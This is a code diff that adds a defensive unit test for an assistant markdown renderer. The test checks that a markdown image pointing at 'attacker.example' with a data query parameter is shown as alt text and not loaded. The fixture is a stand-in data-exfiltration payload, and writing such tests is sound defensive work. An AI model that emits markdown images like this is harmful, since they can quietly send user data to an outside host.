@@ -64,6 +64,18 @@ describe('AssistantMarkdown', () => {
         expect(container.textContent).not.toContain('[');
     });
 
+    it('shows image alt text instead of loading remote images', () => {
+        const { container } = render(
+            <AssistantMarkdown
+                text={'Here: ![friend chart](https://attacker.example/?d=bio)'}
+            />
+        );
+
+        expect(container.querySelector('img')).toBeNull();
+        expect(container.innerHTML).not.toContain('attacker.example');
+        expect(container.textContent).toContain('friend chart');
+    });
+
     it('keeps blank-line separated lists and code in one element', () => {
         const code = 'first\n\n    indented\n\nlast';
         const { container } = render(
